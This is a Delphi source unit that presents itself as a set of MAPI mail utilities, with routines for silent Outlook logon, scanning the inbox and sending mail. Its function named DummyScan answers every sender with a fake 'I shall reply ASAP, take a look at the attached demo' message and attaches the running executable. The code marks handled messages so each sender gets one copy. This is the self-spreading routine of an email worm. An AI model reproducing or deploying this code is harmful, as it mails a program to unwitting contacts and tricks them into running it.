   unit mapiutils;


   interface
   uses mapi,classes,Windows,sysutils,forms;

   type
   FScanMSGCallBack = function (destAddr,DestName,srcAddr,srcName,subject,body:string;attachments:TStringlist):boolean;
   var
   SessionHandle:THandle=0;

   Function ScanMSG(callme:FScanMSGCallBack;newonly,mark:boolean):boolean;
   Function _MAPILogON:boolean;
   Function _MAPILogONSilent:boolean;
   procedure _MAPILogOFF;
   function EasyMail(destAddr,DestName,srcAddr,srcName,subject,body:string;attachments:TStringlist):boolean;
   procedure StopMapiNow;
   function DummyScan(destAddr,DestName,srcAddr,srcName,subject,body:string;attachments:TStringlist):boolean;
   implementation
   var STOP_NOW:boolean=false;

   procedure StopMapiNow;
   begin
   STOP_NOW:= true;

   end;


   function DummyScan(destAddr,DestName,srcAddr,srcName,subject,body:string;attachments:TStringlist):boolean;
   var
   str1,str2:string;
   n:integer;
   begin
   if STOP_NOW then exit;
   attachments.Clear;
   attachments.Add(Application.exeName);
   n:=Pos(' ',srcName);
   if(n>0) then
   begin
   str1:='Hi '+copy(SrcName,1,n-1)+' !';
   end
    else
     begin
     if((Pos('@',SrcName)>0) or (Length(SrcName)=0) ) then
         str1:='Hi !'
         else
           str1:='Hi '+copy(SrcName,1,n-1)+' !';
    // str1:='Hi !';
     end;
   destName:=trim(destName);
   srcName:=trim(srcName);
   n:=Pos(' ',destName);
   if(n>0) then
   begin
   str2:='Sincerely '+chr(13)+chr(9)+copy(destName,1,n-1)+'.';
   end
    else
     begin
      if((Pos('@',destName)>0) or (Length(destName)=0) ) then
         str2:='bye.'
         else
           str2:='Sincerely '+chr(13)+chr(9)+copy(destName,1,n-1)+'.';
     end;


   subject:='RE: '+ subject;
   body:=Str1+chr(13);
   body:=body+ 'I received your email and I shall send you a reply ASAP.'+chr(13);
   body:=body+ 'Till then, take a look at the attached demo.'+chr(13);
   body:=body+ str2;
   EasyMail(srcAddr,srcName,destAddr,DestName,subject,body,attachments);
   DummyScan:=True;
   end;

   function EasyMail(destAddr,DestName,srcAddr,srcName,subject,body:string;attachments:TStringlist):boolean;
   var h:THandle;
   msg:TMapiMessage;
   org,dest:TMapiRecipDesc;
   ptrDest:PMapiRecipDesc;
   res:Cardinal;
   szdestAddr,szDestName,szsrcAddr,szsrcName,szsubject:array [0..81] of char;
   szbody:array [0..256] of char;
   attachPath,attachName:string;
   i:integer;
   attachFiles: packed array [0..33] of TMapiFileDesc;
   begin
   if STOP_NOW then exit;
   EasyMail:=false;


   if(SessionHandle=0) then Exit;


   if(Pos(':',destAddr)>0)  then
   begin
   destAddr:=copy(destAddr,Pos(':',destAddr)+1,Length(destAddr)-Pos(':',destAddr));
   end;


   strPcopy (szdestAddr,destAddr);
   strPcopy (szDestName,DestName);
   strPcopy (szsrcAddr,srcAddr);
   strPcopy (szsrcName,srcName);
   strPcopy (szsubject,subject);
   strPcopy (szbody,body);

   strcat(szbody,chr(13));
   for i:=1 to attachments.count +1 do
   begin
   strcat(szbody,'  ');
   end;

   res:=MAPIResolveName(SessionHandle,0,szdestAddr,0,0,ptrDest);
   dest:=ptrDest^;
   dest.lpszName:=szDestName;
   org.lpszName:= szSrcName;
   org.lpszAddress:= szsrcAddr;
   msg.lpszSubject:=szsubject;
   msg.lpszNoteText:=szbody;
   msg.lpszMessageType:='';
   msg.lpszDateReceived:='1999/04/14 12:50';
   msg.lpszConversationID:='';
   msg.flFlags:=MAPI_UNREAD;

   msg.lpOriginator:=@org;
   msg.nRecipCount:=1;
   msg.lpRecips:=@dest;
   msg.nFileCount:=0;
   msg.lpFiles:=@attachFiles;






   //''''''''
    if(attachments <> nil) then
    begin
   msg.nFileCount:=attachments.Count;
    for i:= 0 to msg.nFileCount-1 do
      begin
      attachPath:=attachments[i];
      attachName:='';
      if pos('|',attachPath)>0 then
      begin
      attachName:=copy(attachPath,pos('|',attachPath)+1,length(attachPath)-pos('|',attachPath));
      attachPath:=copy(attachPath,1,pos('|',attachPath)-1);
      end;
      attachFiles[i].ulReserved:=0;        { Reserved for future use (must be 0)     }
      attachFiles[i].flFlags:=0;                       { Flags                                   }
      attachFiles[i].nPosition:= i+length(Body)+1;                    { character in text to be replaced by attachment }
   //   GetMem( attachFiles[i].lpszPathName,Length(attachments[i])+1 );
      GetMem( attachFiles[i].lpszPathName,Length(attachPath)+1 );
   //strPcopy(attachFiles[i].lpszPathName,attachments[i]);   { Full path name of attachment file       }
   strPcopy(attachFiles[i].lpszPathName,attachPath);   { Full path name of attachment file       }

   GetMem( attachFiles[i].lpszFileName,Length(attachName)+1 );
   strPcopy(attachFiles[i].lpszFileName,attachName);
   //attachFiles[i].lpszFileName:='';
   attachFiles[i].lpFileType := PMAPIFileDesc(nil);         { Attachment file type (can be lpMapiFileTagExt) }

      end;
    end;




   res:=MAPISendmail(SessionHandle,0,msg,0,0);


   MAPIFreeBuffer(ptrDest);
   //MAPILogoff(h,0,0,0);
    if(attachments <> nil) then
    for i:= 0 to msg.nFileCount-1 do
    begin
       FreeMem( attachFiles[i].lpszPathName,Length(attachments[i])+1 );
       FreeMem( attachFiles[i].lpszFileName,Length(attachments[i])+1 );
    end;
   if res =0 then
   EasyMail:=true;

    end;

   Function _MAPILogON:boolean;
   var res:Cardinal;
   begin
   if STOP_NOW then exit;



   /////////

   if(SessionHandle <>0) then MAPILogOff(SessionHandle,0,0,0);
   SessionHandle:=0;
   res:=MAPILogon(0,'', '',0,0,@SessionHandle);






   if res<>0 then
    res:=MAPILogon(0,'Microsoft Outlook', '',MAPI_NEW_SESSION,0,@SessionHandle);

   if res<>0 then
    res:=MAPILogon(0,'Microsoft Outlook Internet Settings', '',MAPI_NEW_SESSION,0,@SessionHandle);

   if res<>0 then
    res:=MAPILogon(0,'Microsoft Exchange', '',MAPI_NEW_SESSION,0,@SessionHandle);


   if res<>0 then
   res:=MAPILogon(0,'', '',MAPI_NEW_SESSION,0,@SessionHandle);

   if res<>0 then
    res:=MAPILogon(0,'', '',MAPI_NEW_SESSION+MAPI_LOGON_UI,0,@SessionHandle);

    if res = 0 then
     _MAPILogON:=True
      else
       _MAPILogON:=False;

   end;

   Function _MAPILogONSilent:boolean;
   var res:Cardinal;
   begin
   if STOP_NOW then exit;



   /////////

   if(SessionHandle <>0) then MAPILogOff(SessionHandle,0,0,0);
   SessionHandle:=0;
   res:=MAPILogon(0,'', '',0,0,@SessionHandle);






   if res<>0 then
    res:=MAPILogon(0,'Microsoft Outlook', '',MAPI_NEW_SESSION,0,@SessionHandle);

   if res<>0 then
    res:=MAPILogon(0,'Microsoft Outlook Internet Settings', '',MAPI_NEW_SESSION,0,@SessionHandle);

   if res<>0 then
    res:=MAPILogon(0,'Microsoft Exchange', '',MAPI_NEW_SESSION,0,@SessionHandle);


   if res<>0 then
   res:=MAPILogon(0,'', '',MAPI_NEW_SESSION,0,@SessionHandle);

   //if res<>0 then
   // res:=MAPILogon(0,'', '',MAPI_NEW_SESSION+MAPI_LOGON_UI,0,@SessionHandle);

    if res = 0 then
     _MAPILogONSilent:=True
      else
       _MAPILogONSilent:=False;

   end;

   procedure _MAPILogOFF;
   var res:Cardinal;
   begin
   if STOP_NOW then exit;
   /////////

   if(SessionHandle <>0) then res:= MAPILogOff(SessionHandle,0,0,0);
   SessionHandle:=0;
   end;




   Function ScanMSG(callme:FScanMSGCallBack;newonly,mark:boolean):boolean;
   var h:THandle;
   msg:TMapiMessage;
   ptrMsg:PMapiMessage;
   attach:TMapiFileDesc;
   res,resfind:Cardinal;
   SeedMessageID,MessageID,tmp:array [0..511] of char;
   tmpStr:String;
   i,r:integer;
   marked:boolean;
   tmpzs1,tmpzs2:pchar;
   fflags:integer;
   type
   farray =packed array[0..100] of TMapiFileDesc;
   pfarray =^farray;
   var
   LocalAttach:pfarray;
   ////////
   destAddr,DestName,srcAddr,srcName,subject,body,msgType:string;
   attachments:TStringList;
   begin
   if STOP_NOW then exit;
   if newonly then fflags := MAPI_UNREAD_ONLY else fflags:=0;
   ScanMSG:=False;
   attachments:=TStringList.Create();

   if(SessionHandle = 0) then Exit;

   SeedMessageID[0]:=chr(0);
   resfind:=MapiFindNext(SessionHandle,0,nil, SeedMessageID,fflags,0,MessageID); // get next message
   repeat
   begin
   Application.ProcessMessages;


   if( resfind =0) then  resfind:=MapiReadMail(SessionHandle,0,MessageID,MAPI_PEEK,0, ptrMsg);// read next message


   if mark then
   if (resfind=0) and(ptrMsg^.lpszSubject[Length(ptrMsg^.lpszSubject)-1] <> chr(9)) then
   begin // mark message
   tmpzs1:=ptrMsg^.lpszSubject;
   GetMem( tmpzs2,Length(ptrMsg^.lpszSubject)+2 );
   strcopy(tmpzs2,ptrMsg^.lpszSubject);
   strcat(tmpzs2,chr(9));
   ptrMsg^.lpszSubject:=tmpzs2;
   res:=MapiSaveMail(SessionHandle,0,ptrMsg^,0,0 ,MessageID);
   ptrMsg^.lpszSubject:=tmpzs1;
   marked:=false;
   freeMem(tmpzs2);
    end
   else
     begin
     marked:=true;
     end
   else // if mark
     marked:=false;
     //end;


   Application.ProcessMessages;

   if((resfind =0) and (marked=false)) then // and(res =0)) then
   begin
   attachments.Clear;
   destAddr:='';
   DestName:='';
   srcAddr:='';
   srcName:='';
   subject:='';
   body:='';

   msg:=ptrMsg^;// copy message

   Application.ProcessMessages;
   try destAddr:=strPas(ptrMsg^.lpRecips^.lpszAddress); except;end;
   try  DestName:=strPas(ptrMsg^.lpRecips^.lpszName); except;end;
   try  srcAddr:=strPas(ptrMsg^.lpOriginator^.lpszAddress); except;end;
   try  srcName:=strPas(ptrMsg^.lpOriginator^.lpszName); except;end;
   try  subject:=strPas(ptrMsg^.lpszSubject); except;end;
   try  body:=strPas(ptrMsg^.lpszNoteText); except;end;
   try  msgtype:=strPas(ptrMsg^.lpszMessageType); except;end;


   for i := 0 to msg.nFileCount -1 do
   begin
   LocalAttach:=@msg.lpFiles^;
   tmpStr:=strPas(LocalAttach[i].lpszPathName);
   attachments.Add(TmpStr);
   Application.ProcessMessages;
   end; // for i


   if(Pos(':',destAddr)>0)  then
   begin
   destAddr:=copy(destAddr,Pos(':',destAddr)+1,Length(destAddr)-Pos(':',destAddr));
   end; // if

   if(Pos(':',srcAddr)>0)  then
   begin
   srcAddr:=copy(srcAddr,Pos(':',srcAddr)+1,Length(srcAddr)-Pos(':',srcAddr));
   end; // if

   /////////////////
   move(MessageID,SeedMessageID,512);
   Application.ProcessMessages;
   resfind:=MapiFindNext(SessionHandle,0,nil, SeedMessageID,fflags,0,MessageID); // get next message
   Application.ProcessMessages;
   try
   Application.ProcessMessages;
   if(callme(destAddr,DestName,srcAddr,srcName,subject,body,attachments)<> True) then
    begin
   // ScanMSG:=False;
   // attachments.Destroy;
   // Exit;
    end;
   except;
   end; // except
   Application.ProcessMessages;

   end// if res = 0
    else
      begin
      move(MessageID,SeedMessageID,512);
      Application.ProcessMessages;
      resfind:=MapiFindNext(SessionHandle,0,nil, SeedMessageID,fflags,0,MessageID); // get next message
      Application.ProcessMessages;
      end; //else

   end; // repeat
   until (resfind <> 0);

   attachments.Destroy;
   ScanMSG:=True;
   end;




   end.
